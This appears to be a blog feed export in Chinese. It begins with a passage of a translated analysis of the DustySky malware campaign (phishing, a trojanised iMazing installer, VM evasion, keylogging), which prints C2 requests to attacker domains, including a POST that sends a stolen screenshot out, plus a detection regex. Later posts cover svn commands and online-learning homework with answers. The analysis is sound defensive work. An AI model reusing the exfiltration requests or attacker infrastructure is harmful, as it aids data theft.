<p>当从恶意消息链接时，恶意软件将托管在云服务上（在copy.com中多次，合法文件托管服务），或者在攻击者控制的服务器上托管。</p>
<h2 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h2><p>当恶意软件托管在受攻击者控制的服务器上时，目标浏览器的用户代理字符串在单击恶意链接时会被检查。 如果目标使用Windows，则提供DuskySky。 如果操作系统与Windows不同，则目标服务于Google，Microsoft或Yahoo网络钓鱼页面</p>
<p>网络钓鱼页面的源代码由单个JavaScript块组成，在运行时将单个变量解码为HTML：</p>
<img src = "Operation DustySky_04.png" width = 80%>

<p>在受害者填写并发送虚假登录表单后，他们将被重定向到合法网站。 例如，在一个案例中，受害者被重定向到以色列新闻网站NRG中的新闻项目。 只有新闻项目是旧的（从攻击前一年开始）并且与恶意电子邮件的原始主题无关。 它可能用于以前的攻击，攻击者不够关心或忘记将其更改为相关攻击。</p>
<h2 id="攻击软件开发人员"><a href="#攻击软件开发人员" class="headerlink" title="攻击软件开发人员"></a>攻击软件开发人员</h2><p>IP地址45.32.13.169以及指向它的所有域都拥有一个网页，该网页是合法且无关的软件网站的副本 -  iMazing，一种iOS管理软件。</p>
<img src = "Operation DustySky_08.png" width = 80%>

<p>这些域名中有一个类似的东西 - imazing[.] ga。<br>假网站的源代码显示它是在2015年10月22日从合法来源复制的：</p>
<img src = "Operation DustySky_05.png" width = 80%>

<p>虚假网站与合法网站类似，为访问者提供下载iMazing软件的功能。 但是，虚假网站上的版本与DustySky恶意软件捆绑在一起。 在执行恶意版本（2f452e90c2f9b914543847ba2b431b9a）时，安装了合法的iMazing，而在后台DustySky被删除为名为Plugin.exe（1d9612a869ad929bd4dd16131ddb133a）的文件，并执行：</p>
<img src = "Operation DustySky_06.png" width = 80%>

<p>有趣的是，我们发现自由职业者市场网站freelancer.com上发布的职位发布中提到的虚假域名’imazing [.] ga’。 在帖子中，攻击者声称他们正在寻找某人建立“像这个网站[sic]这样的应用程序”，并诱使观众“从’imazing [.] ga’下载应用程序并忽视[sic]” “如果有任何想法缺失或……，请告诉我。”</p>
<img src = "Operation DustySky_09.png" width = 80%>

<p>这种行为偏离了攻击者通常向选定（虽然很多）个人发送恶意电子邮件的模式。 我们不清楚为什么他们会追随随机感染，但我们可以想象各种原因，例如访问可用作攻击代理的计算机，或获取受害者拥有的软件的许可证。</p>
<h2 id="感染后"><a href="#感染后" class="headerlink" title="感染后"></a>感染后</h2><p>本节介绍攻击者对我们调查过的受感染计算机执行的操作。 在感染计算机后，攻击者使用了DustySky的功能，以及他们随后下载到计算机的公共黑客工具。</p>
<p>他们在计算机中截取了屏幕截图和活动进程列表，并将它们发送到命令和控制服务器。 他们使用了BrowserPasswordDump，这是一个免费使用的公共工具，用于恢复保存在浏览器中的密码。 以下是我们在攻击者删除它后恢复的日志文件（在本例中为空）：</p>
<img src = "Operation DustySky_10.png" width = 80%>

<p>恶意软件还会扫描计算机以查找包含特定关键字的文件。 base64格式的关键字列表从命令和控件中检索为文本文件。 例如：</p>
<img src = "Operation DustySky_11.png" width = 40%>

<img src = "Operation DustySky_12.png" width = 80%>

<p>这些话告诉我们攻击者所追求的是什么：个人文件; 凭证，证书和私钥; 有关国土安全的信息。</p>
<h2 id="滥用破坏的电子邮件帐户"><a href="#滥用破坏的电子邮件帐户" class="headerlink" title="滥用破坏的电子邮件帐户"></a>滥用破坏的电子邮件帐户</h2><p>在一个案例中，攻击者使用窃取的电子邮件凭据并从96.44.156.201登录，可能是他们的代理或VPN端点。 他们还从5.101.140.118登录，这是一个属于名为privatetunnel.com的代理服务的IP地址（在之前的事件中，电子邮件是从附近的地址发送的 -  5.101.140.114）。</p>
<h1 id="恶意软件分析"><a href="#恶意软件分析" class="headerlink" title="恶意软件分析"></a>恶意软件分析</h1><p>DustySky（由其开发人员称为NeD）是一个用.NET编写的多阶段恶意软件。 本章将介绍其功能和主要功能。 分析的样本是589827c4cf94662544066b80bfda6ab从2015年8月下旬开始。它由DustySky dropper，DustySky核心和DustySky键盘记录组件组成。</p>
<h2 id="DustySky-dropper"><a href="#DustySky-dropper" class="headerlink" title="DustySky dropper"></a>DustySky dropper</h2><p>DustySky dropper试图逃避在虚拟机中运行。 一旦确定计算机不是VM，它就会提取，运行并向DustySky Core添加持久性。 它提取有关操作系统的基本信息，并检查是否存在防病毒。 它还提取并打开诱饵文档。</p>
<p>dropper的资源是在运行时删除的两个组件。 一个是诱饵文件（内部称为“新闻”），一旦执行dropper就会呈现给受害者。 另一个是DustySky Core，一个特洛伊木马后门，（内部称为“日志”）。</p>
<p>dropper使用以下函数来混淆函数名称和恶意软件的其他部分（在以后的版本中，使用了SmartAssembly 6.9.0.114 .NET混淆器）：</p>
<img src = "Operation DustySky_13.png" width = 80%>

<p>对于VM规避，dropper会检查是否存在指示恶意软件在虚拟机中运行的DLL（vboxmrxnp.dll和vmbusres.dll表示虚拟机和vmGuestlib.dll，表示vmware）。</p>
<p>如果dropper确实在虚拟机中运行，它将打开诱饵文档并停止其活动：</p>
<img src = "Operation DustySky_14.png" width = 80%>

<p>Dropper使用Windows Management Instrumentation来提取有关操作系统以及防病毒是否处于活动状态的信息。</p>
<p>DustySky Core被删除到％TEMP％并使用cmd或.NET界面运行。</p>
<img src = "Operation DustySky_15.png" width = 60%>

<p>在计算机重新启动后为持久性创建一个注册表项：</p>
<img src = "Operation DustySky_16.png" width = 80%>

<h2 id="DustySky核心"><a href="#DustySky核心" class="headerlink" title="DustySky核心"></a>DustySky核心</h2><p>DustySky Core是一个特洛伊木马后门程序，也是恶意软件的主要组成部分。 它与命令和控制服务器通信，对收集的数据，信息和文件进行泄露，并接收和执行命令。 它具有以下功能：</p>
<ul>
<li>收集有关操作系统版本，运行进程和已安装软件的信息。</li>
<li>搜索可移动媒体和网络驱动器，并将其自身复制到其中。</li>
<li>提取其他组件（例如键盘记录组件）或从命令和控制服务器接收它们，然后运行或删除它们。</li>
<li>逃避虚拟机。</li>
<li>关闭计算机或重新启动计算机。</li>
<li>确保只有一个恶意软件实例正在运行。</li>
</ul>
<p>键盘记录日志文件每50秒上传到服务器。 这些文件通过POST请求上传到以key.php结尾的URL。</p>
<img src = "Operation DustySky_17.png" width = 80%>

<h2 id="DustySky键盘记录组件"><a href="#DustySky键盘记录组件" class="headerlink" title="DustySky键盘记录组件"></a>DustySky键盘记录组件</h2><p>DustySky核心中包含的组件之一是键盘记录器（例如15be036680c41f97dfac9201a7c51cfc）。 当命令和控制服务器命令时，提取并执行键盘记录器。 键盘记录日志保存到％TEMP％\ temps。</p>
<h2 id="pdb分析"><a href="#pdb分析" class="headerlink" title="pdb分析"></a>pdb分析</h2><p>DustySky示例中的pdb字符串结构如下：</p>
<p>b：\ World-2015 \ IL \ Working Tools \ 2015-12-27 NeD Ver 9 Rand  -  192.169.6.199 \ NeD Worm \ obj \ x86 \ Release \ MusicLogs.pdb</p>
<p>来自23个样本的pdb字符串显示在“附录B  - 指标”中。 在下表中，我们提供了包含pdb字符串的文件夹和文件名的细分，以反映DustySky自2015年5月首次发布以来的持续开发周期。</p>
<img src = "Operation DustySky_18.png" width = 80%>

<h1 id="指挥与控制沟通"><a href="#指挥与控制沟通" class="headerlink" title="指挥与控制沟通"></a>指挥与控制沟通</h1><h2 id="交通示例"><a href="#交通示例" class="headerlink" title="交通示例"></a>交通示例</h2><p>以下是与命令和控制服务器通信的示例（标识符已被更改）。</p>
<p>DustySky有两个硬编码的命令和控制服务器域。 它首先通过向TEST.php或index.php发送GET请求来检查第一个是否处于活动状态，期望“OK”作为响应。 如果没有收到确定，它将尝试第二个域。</p>
<img src = "Operation DustySky_19.png" width = 80%>

<p>例如，这是对index.php的初始GET请求：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: facetoo.co[.]vu</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure>

<p>服务器回复:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sun, 06 Sep 2015 19:52:49 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.3.3</span><br><span class="line">Content-Length: 2</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>接下来，发送GET请求，其中包含有关受感染计算机的信息，如Base64参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">/IOS.php?Pn=9TbmRvd3KTxpbmRvd3icj4&amp;fr=&amp;GR=RmFjZUJvb2soSU9TKTxicj4gMjAxNS</span><br><span class="line">0wOC0yNA&amp;com=IDxicj4gIDxicj4g&amp;ID=386578203222222738119472812481673914678</span><br><span class="line">&amp;o=TWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwg&amp;ho=ZmFjZXRvby5jby52dQ==&amp;</span><br><span class="line">av=&amp;v=501P HTTP/1.1</span><br><span class="line">User-Agent: 386578203222222738119472812481673914678</span><br><span class="line">Host: facetoo.co[.]vu</span><br></pre></td></tr></table></figure>

<p>GET请求中URL的另一个示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://ra.goaglesmtp.co.vu/NSR.php?Pn=MWw1bEoxVDJqQiB8IFBTUFVCV1M&amp;fr=&amp;GR=REFGQksoTlNSKTxicj4gMjAxNS0xMS0wNA&amp;com=IDxicj4gIDxicj4g&amp;ID=13327920924134561851231757518321517760252DAFBK&amp;o=TWljcm9zb2Z0IFdpbmRvd3MgNyBIb21lIFByZW1pdW0g&amp;ho=cmEuZ29hZ2xlc210cC5jby52dQ==&amp;av=&amp;v=704</span><br></pre></td></tr></table></figure>

<img src = "Operation DustySky_20.png" width = 80%>

<p>以下正则表达式与通信模式匹配：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">\/[A-<span class="title class_">Za</span>-z]&#123;<span class="number">2</span>,<span class="number">5</span>&#125;\.<span class="property">php</span>\?(?:(<span class="title class_">Pn</span>|fr|<span class="variable constant_">GR</span>|com|<span class="variable constant_">ID</span>|o|ho|av|v)=[A-<span class="title class_">Za</span>-z0-<span class="number">9</span>\/=+]*=&#123;<span class="number">0</span>,<span class="number">2</span>&#125;&amp;?)&#123;<span class="number">5</span>,<span class="number">9</span>&#125;</span><br></pre></td></tr></table></figure>

<p>作为POST请求发送到命令和控制的被盗信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /RaR.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: 1042541562231131292551331782259622162135190107BK</span><br><span class="line">Host: down.supportcom.xyz</span><br><span class="line">Content-Length: 109127</span><br><span class="line">Expect: 100-continue</span><br><span class="line"></span><br><span class="line">ke=iVBORw0KGgoAAAANSUhEUgAAAyAAAAJYCAYAAACadoJwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEh....</span><br><span class="line">ID=1042541562231131292551331782259622162135190107BK&amp;</span><br><span class="line">N=Screen-2015-10-06_05-15-34-PM.png</span><br><span class="line">HTTP/1.1 100 Continue</span><br></pre></td></tr></table></figure>

<h2 id="SSL和数字证书"><a href="#SSL和数字证书" class="headerlink" title="SSL和数字证书"></a>SSL和数字证书</h2><p>最近，命令和控制通信从HTTP变为HTTPS。 HTTPS流量中使用的数字证书可以是自签名的，也可以使用合法的Comodo颁发的证书。</p>
<p>域名’bulk-smtp [.] xyz’由攻击者拥有，使用以下数字证书：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number:</span><br><span class="line">            35:e5:39:4c:58:e8:4d:f5:fa:9a:3c:25:21:12:01:19</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited,CN=COMODO RSA Domain Validation Secure Server CA</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 25 00:00:00 2015 GMT</span><br><span class="line">            Not After : Nov 24 23:59:59 2016 GMT</span><br><span class="line">        Subject: OU=Domain Control Validated, OU=PositiveSSL, CN=bulk-smtp.xyz</span><br></pre></td></tr></table></figure>

<img src = "Operation DustySky_21.png" width = 60%>
<img src = "Operation DustySky_22.png" width = 60%>

<p>在使用Comodo颁发的证书之前，攻击者使用了自签名证书，冒充一家名为EMS的以色列TelAviv公司。 证书中的组织统一性是“电子邮件营销销售”</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 3 (0x2)</span><br><span class="line">        Serial Number: 13229300438499639338 (0xb797eaa82fb0c02a)</span><br><span class="line">    Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">        Issuer: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 17 14:15:08 2015 GMT</span><br><span class="line">            Not After : Nov 16 14:15:08 2016 GMT</span><br><span class="line">        Subject: C=IL, ST=Israel - Telaviv, L=Tel Aviv, O=EMS, OU=Email Markting Sales, CN=email-market.ml/emailAddress=info@email-market.ml</span><br></pre></td></tr></table></figure>

<p>对于另一个域smtp.gq，使用了这个自签名证书：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Certificate:</span><br><span class="line">    Data:</span><br><span class="line">        Version: 1 (0x0)</span><br><span class="line">        Serial Number: 12074485766838107425 (0xa79130d4e1e53d21)</span><br><span class="line">    Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">        Issuer: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co., CN=smtp.gq/emailAddress=info@smtp.gq</span><br><span class="line">        Validity</span><br><span class="line">            Not Before: Nov 17 14:48:51 2015 GMT</span><br><span class="line">            Not After : Dec 17 14:48:51 2015 GMT</span><br><span class="line">        Subject: C=IL, ST=Tel Aviv, L=Tel Aviv, O=BEM, OU=BEM co.,CN=smtp.gq /emailAddress=info@smtp.gq</span><br></pre></td></tr></table></figure>

<p>与其命令和控制服务器通信时，DustySky通信使用以下部分或全部路径：</p>
<ul>
<li>Update.php</li>
<li>conn.php</li>
<li>geoiploc.php</li>
<li>news.htm</li>
<li>pass.php</li>
<li>passho.php</li>
<li>passyah.php</li>
</ul>
<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>使用PassiveTotal的攻击分析平台，我们能够可视化演员使用的关键基础设施的最近6个月的数据。 值得注意的是，在过去几周内所有IP地址都处于活动状态，其中许多域解析为动态DNS提供商（蓝色方块）和注册域（棕色方块）的组合（绿色方块）。 这些热图使我们能够识别可能由于演员调整战术而导致的有趣时期或基础设施变化。</p>
<img src = "Operation DustySky_23.png" width = 80%>

<p>在此图中，我们可以看到演员在12月23日之前使用了动态DNS和注册域的组合。 在那一天，演员似乎删除了注册域并严格使用动态DNS。 目前还不清楚为什么会发生这种情况，但服务器可能会改变攻击中的功能或者不再需要它。</p>
<img src = "Operation DustySky_24.png" width = 80%>

<p>在此图中，颜色可清楚地分析发生的活动。 感兴趣的主要时期似乎是动态DNS和注册域都在使用时。 这种情况发生在9月23日到12月17日，并且有很多天新域名与IP地址相关联。 虽然并不完全清楚，但这一时期可能反映了演员在其行动中的存在。 根据发送的电子邮件和编译日期，在此期间有大量的网络钓鱼活动正在进行中。 值得注意的是，此IP地址不再显示任何可能意味着已脱机的内容。</p>
<img src = "Operation DustySky_25.png" width = 80%>

<p>在此图中，我们看到从9月9日开始的活动被定向到动态DNS提供商。 与Graph One类似，我们可以看到11月份时间段内域名增加，12月份下降。 同样，并不完全清楚，但11月可能是攻击者认为有必要使他们在攻击中使用的域名多样化的点。</p>
<img src = "Operation DustySky_26.png" width = 80%>

<p>在此图中，灰色块表示大多数时间没有捕获任何活动。 从11月9日开始，演员们在添加动态DNS提供商之前引入了四个独特的注册域名。 这个IP地址最有趣的是动态DNS网址和注册域的内容导致托管Windows可执行文件的同一下载页面。 目前还不清楚为什么攻击者继续使用这两者，但是从注册域名转移到使用动态DNS域名也可能表明参与者开始明智了。 动态DNS基础结构的使用使得归因和跟踪更加困难，因为动态DNS域可以由无关联方共享。</p>
<img src = "Operation DustySky_27.png" width = 80%>

<p>在此图中，我们看到直到最近几个月同样缺乏数据以及动态DNS和注册域的使用。 鉴于最近的活动以及指向此IP地址的大量域名，这个服务器可能是最新的参与者，这似乎是合理的。 事实上，它可能涉及我们在今年看到的持续运营。</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>svn学习笔记</title>
    <url>/blogs/2019-02-18-svnStudy/</url>
    <content><![CDATA[<h1 id="命令解析"><a href="#命令解析" class="headerlink" title="命令解析"></a>命令解析</h1><h2 id="更新文件"><a href="#更新文件" class="headerlink" title="更新文件"></a>更新文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svn update #当前目录所有文件更新到最新</span><br></pre></td></tr></table></figure>

<h2 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svn add test.php                        #添加test.php </span><br><span class="line">svn commit -m “添加我的测试用test.php“    #提交</span><br><span class="line">svn add *.php                           #添加当前目录下所有的php文件</span><br><span class="line">svn commit -m “添加我的测试用全部php文件“   #提交</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>版本控制</tag>
      </tags>
  </entry>
  <entry>
    <title>在线机器学习作业解答</title>
    <url>/blogs/2019-01-11-onelineMachineLearningHWAnswer/</url>
    <content><![CDATA[<h1 id="Homework-1"><a href="#Homework-1" class="headerlink" title="Homework 1"></a>Homework 1</h1><h2 id="1-Answer："><a href="#1-Answer：" class="headerlink" title="1. Answer："></a>1. Answer：</h2><h2 id="2-Answer："><a href="#2-Answer：" class="headerlink" title="2. Answer："></a>2. Answer：</h2><p>$ \because f\ is\ a\ convex\ function $<br>$ \therefore f(\alpha x + (1 - \alpha)x’) \leq \alpha f(x) + (1 - \alpha) f(x’) $<br>$ \because g\ is\ a\ monotonically\ non-decreasing\ function,$<br>$ \therefore $<br>$$ g[f(\alpha x + (1 - \alpha)x’)] \leq g[\alpha f(x) + (1 - \alpha) f(x’)] \tag{1} $$<br>$ \because g\ is\ a\ convex\ function $<br>$ \therefore $<br>$$ g[\alpha f(x) + (1 - \alpha)f(x’)] \leq \alpha g[f(x)] + (1 - \alpha) g[f(x’)] \tag{2} $$<br>$ (1) &amp; (2) \Rightarrow $<br>$$ \begin{array}{rl}<br>    g[f(\alpha x + (1 - \alpha)x’)] &amp; \leq \alpha g[f(x)] + (1 - \alpha) g[f(x’)] \\<br>    g \circ f(\alpha x + (1 - \alpha)x’) &amp; \leq \alpha g \circ f(x) + (1 - \alpha) g \circ f(x’) \\<br>\end{array} $$<br>$ \therefore g \circ f\ is\ convex $</p>
<h2 id="3-Answer"><a href="#3-Answer" class="headerlink" title="3. Answer:"></a>3. Answer:</h2><h3 id="a"><a href="#a" class="headerlink" title="a."></a>a.</h3><p>$ t &#x3D; 1, \phi_1 &#x3D; \phi_0 $<br>$ t &#x3D; 2, \phi_2 &#x3D; \sum_{i &#x3D; 1}^{n} \frac{\phi_1 w_{2, i} c_{2, i}}{c_{1, i}} &#x3D; \phi_1 \sum_{i &#x3D; 1}^{n} \frac{w_{2, i} c_{2, i}}{c_{1, i}} $<br>…<br>$ t &#x3D; t, \phi_t &#x3D; \phi_0 \prod_{j &#x3D; 1}^{t - 1}\sum_{i &#x3D; 1}^{n} \frac{w_{j + 1, i} c_{j + 1, i}}{c_{j, i}} $</p>
<h3 id="b"><a href="#b" class="headerlink" title="b."></a>b.</h3><p>$ t &#x3D; t, \phi_t &#x3D; \phi_0 \prod_{j &#x3D; 1}^{t - 1}\sum_{i &#x3D; 1}^{n} \frac{w_i c_{j + 1, i}}{c_{j, i}} $</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>在线机器学习作业</title>
    <url>/blogs/2019-01-05-onlineMachineLearningHomework/</url>
    <content><![CDATA[<h1 id="Homework-1"><a href="#Homework-1" class="headerlink" title="Homework 1"></a>Homework 1</h1><p>在在线优化设置中，玩家玩点$w_t \in W $，对手以非负函数$f_t$响应，并且玩家遭受$f_t(w_t)$的损失。 假设$W$是一个有界集合，并且每个$f_t$在$W$上有较低的界限。玩家在$T$轮之后的遗憾被定义为：<br>$$ \sum_{t &#x3D; 1}^{T} f_t(w_t) - \min\limits_{w \in W} \sum_{t &#x3D; 1}^{T} f_t(w) $$<br>遗憾的界限是函数$R(T)$，使得对于任何序列$f_1, …, f_T$它保持：<br>$$ \forall T \sum_{t &#x3D; 1}^{T} f_t(w_t) - \min\limits_{w \in W} \sum_{t &#x3D; 1}^{T} f_t(w) \leq R(T) $$</p>
<ol>
<li><p>首先，证明我们可以在不失一般性的情况下假设每个$t$的$\min f_t(x) &#x3D; 0$。<br>如果：<br>$$ f_t(w_t) &#x3D; 0 \Rightarrow w_{t + 1} &#x3D; w_t $$<br>在线优化算法是保守的。换句话说，保守算法只要不遭受任何损失就会保持同一点。设$A$为具有$R(T)$的后悔界限的在线优化算法。使用$A$定义具有相同后悔限制的保守在线优化算法$A’$.</p>
</li>
<li><p>回想一下，如果对于$f$域中的任何$\alpha \in [0, 1]$和任何$x$和$x’$，$f(\alpha x + (1 - \alpha)x’) \leq \alpha f(x) + (1 - \alpha) f(x’)$则函数$f$是凸的。 令$f: R \mapsto R$为凸函数，并且令$g: R \mapsto R$为凸单调非递减函数。 证明组合物$g \circ f$是凸的$(g \circ f(x) \equiv g(f(x)))$</p>
</li>
<li><p>考虑在没有交易成本的市场中管理在线股票投资组合的问题。 假设市场有$n$个不同的股票，我们可以在每个交易日结束时改变我们的投资组合，并且在第$t$天结束时的$n$个股票的价格由向量$c_t$表示。 我们最初的财富是$\phi_0$，而我们在$t$之后的财富是$\phi_t$。 在每一轮中，我们播放分布向量$w_t \in W$（$W$是总和为1的非负向量的集合）。 也就是说，在第$t$轮，我们在股票$i$上投资$\phi_{t - 1}w_{t, i}$美元。</p>
<ul>
<li>根据$w_1, …, w_t$和$c_0, c_1, …, c_t$写$\phi_t$</li>
<li>由固定概率向量$w$定义的不断重新平衡的投资组合（CRP）是一种每天重新平衡的投资策略，因此我们每天都将我们的财富$w_i$投资于股票$i$。 设$\phi_t^w$表示在第$t$天由$w$定义的CRP的财富。 根据$w$和$c_0, c_1, …, c_t$写$\phi_t^w$</li>
<li>在$T$轮之后将事后的最佳CRP定义为$\phi_T^* &#x3D; max_w \phi_T^w$。 在$T$轮之后定义遗憾作为$log(\phi_T^* &#x2F; \phi_T)$。表明最小化这种遗憾的定义是在课堂上讨论的在线凸优化框架的一个特例（提示：使用问题2来表明–$log(u \cdot v)$是凸的并且将投资组合管理问题写成在线凸优化问题）</li>
</ul>
</li>
</ol>
<h1 id="Homework-2"><a href="#Homework-2" class="headerlink" title="Homework 2"></a>Homework 2</h1><ol>
<li><strong>加倍的把戏</strong> 你得到一个在线算法$A$保证$Regret \leq T^p$，对于某些$p \in (0, 1)$，但它有参数必须作为$T$的函数选择。使用这个算法作为黑盒子，我们将构造一个遗憾的算法 对所有$T$同时保留的绑定$O(T^p)$.特别是，我们将分析以下转换：<br>$\textbf{for}\ epoch\ m &#x3D; 0, 1, 2, …\ \textbf{do}$<br>$\qquad Reset\ A\ with\ parameters\ chosen\ for\ T &#x3D; 2^m$<br>$\qquad \textbf{for}\ rounds\ t &#x3D; 2^m, …, 2^{m + 1} - 1\ \textbf{do}$<br>$\qquad \qquad Run\ A$<br>本质上，该算法最初猜测$T &#x3D; 1$，当它观察到这个猜测太低时，它将它的初始猜测加倍并重新启动$A$.因此，这被称为“双重技巧”<br>要显示所需的遗憾，请考虑任何T，和<ul>
<li>表明对边界$1$到$T$的遗憾小于或等于时期$m &#x3D; 0$到时期$m_T &#x3D; [log_2(T)]$结束时的遗憾。 然后，使用$A$的遗憾绑定这些时代的累积遗憾</li>
<li>简化(a)的界限，表明它的上限是常数$T^p$的上限。提示：使用$x \neq 1$的事实:<br> $$ \sum\limits_{k &#x3D; 0}^n x^k &#x3D; \frac{x^{n + 1} - 1}{x - 1} $$</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
  </entry>
  <entry>
    <title>在线机器学习课程笔记</title>
    <url>/blogs/2019-01-02-onlineMachineLearningNotes/</url>
    <content><![CDATA[<h1 id="lecture-0"><a href="#lecture-0" class="headerlink" title="lecture 0"></a>lecture 0</h1><h2 id="Alpha-Go-深度学习-强化学习-蒙特卡洛树查询"><a href="#Alpha-Go-深度学习-强化学习-蒙特卡洛树查询" class="headerlink" title="Alpha Go: 深度学习+强化学习+蒙特卡洛树查询"></a>Alpha Go: 深度学习+强化学习+蒙特卡洛树查询</h2><ul>
<li>蒙特卡洛搜索树： 用于树遍历的具有PUCT功能的某些变体</li>
<li>残余卷积神经网络： 用于游戏评估和移动先验概率估计的政策和价值网络</li>
<li>强化学习： 用于通过自我游戏训练网络</li>
</ul>
<h2 id="深度学习vs在线学习"><a href="#深度学习vs在线学习" class="headerlink" title="深度学习vs在线学习"></a>深度学习vs在线学习</h2><ul>
<li>大多数深度学习模型可以在线学习</li>
<li>在线学习基于计算机实验</li>
<li>在线学习有更少的数学求导</li>
<li>深度学习更像CS&amp;CE类型的调查</li>
<li>在线学习属于统计机器学习一类</li>
<li>在线学习是数学类多学科的，属于应用数学和运筹学</li>
<li>受EE领域的研究者喜爱</li>
<li>可以证明很多定理并发表出版</li>
</ul>
<h3 id="为什么讲这个学科"><a href="#为什么讲这个学科" class="headerlink" title="为什么讲这个学科"></a>为什么讲这个学科</h3><ul>
<li>十分热门，在ECE主题中广泛应用</li>
<li>深度学习和在线学习都是十分热门的学科</li>
</ul>
<h2 id="课程介绍"><a href="#课程介绍" class="headerlink" title="课程介绍"></a>课程介绍</h2><ul>
<li>在线学习对于天气预报、股市趋势预测和那种广告显示在web页面这些随后的预测问题十分在行</li>
<li>在线学习算法观察一个例子流并对每个元素进行预测</li>
<li>算法收到每个预测快速的反馈并使用反馈来提升随后预测的准确度</li>
<li>与统计机器学习相比，在线学习算法不会对他们观察到的数据做出随机假设，甚至可以处理恶意攻击者生成数据的情况。</li>
<li>最近有一系列关于在线学习算法的科学研究，主要是因为它们广泛适用于网络规模的预测问题</li>
<li>本课程将对最先进的在线学习算法进行严格的介绍，重点是算法设计和理论分析。</li>
<li>主题包括：凸分析背景，遗憾最小化，在线优化，专家问题，部分反馈的在线学习和探索&#x2F;利用权衡（a.k.a.强盗问题）和一系列高级主题</li>
</ul>
<h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h3><p>本课程假设基本概率论和线性代数的背景。 关键数学概念将在使用前进行审核，但预计会有一定程度的数学成熟度。 该课程是理论性的，不涉及编程（但研究工作需要编程）</p>
<ul>
<li>凸优化理论初探</li>
<li>线性代数</li>
<li>概率论</li>
<li>一点信息论</li>
<li>matlab</li>
</ul>
<h2 id="在线梯度下降"><a href="#在线梯度下降" class="headerlink" title="在线梯度下降"></a>在线梯度下降</h2><ul>
<li><strong>遵循正则化的领导者</strong> 遵循正则化领导者（FTRL）算法族在某种程度上是在线学习中最基本的算法。 我们将使用通用且非常强大的引理来介绍和分析算法的简单实例。还将介绍凸分析的一些必要背景。</li>
<li><strong>在线梯度下降</strong> 在线梯度下降算法是随机梯度下降的近亲。 我们将对线性函数进行遗憾绑定分析，并展示相同的边界如何应用于自由到一般凸函数。可以立即为我们提供了逻辑回归和线性支持向量机的算法。</li>
<li><strong>自适应坐标学习率</strong> 这种对梯度下降的简单修改可以在大型数据集上产生显着更好的性能。我们通过一维示例说明全局学习率的问题，然后扩展前一讲的分析，以便在使用自适应坐标学习率时提供更严格的界限。</li>
</ul>
<h2 id="计划主题"><a href="#计划主题" class="headerlink" title="计划主题"></a>计划主题</h2><ul>
<li><strong>遵循近端正则化的领导者</strong> 我们表明，遵循正则化的领导者和在线梯度下降是密切相关的。 但是，他们的行为在某些重要方面有所不同。 我们展示了如何在FTRL上下文中更有效地实现用于产生稀疏模型的L1正则化（例如，Lasso算法）。</li>
<li><strong>遗憾的替代概念</strong> 到目前为止，我们通过将其性能与固定的最佳后见比较器进行比较来分析算法。 然而，对于某些应用，其他遗憾概念更合适，例如，当世界的“真实”模型正在发生变化时。</li>
<li><strong>镜像下降</strong> 镜像下降推广了在线梯度下降，并允许我们为许多其他问题开发算法。 我们考虑最好的专家问题，在每一轮我们必须从一组中选择一个“专家”，我们遵循这一轮的建议。</li>
<li><strong>强盗算法</strong> 用于k武装强盗问题的算法通过部分反馈扩展了最佳专家问题。</li>
<li>在每一轮中，您只能了解通过跟随您选择的专家获得的奖励; 你无法直接了解其他专家是否会更好。</li>
<li>例如，考虑在网页上向用户展示广告 - 我们将广告建模为“专家”，如果我们不选择展示广告，则无法知道用户是否会点击广告。</li>
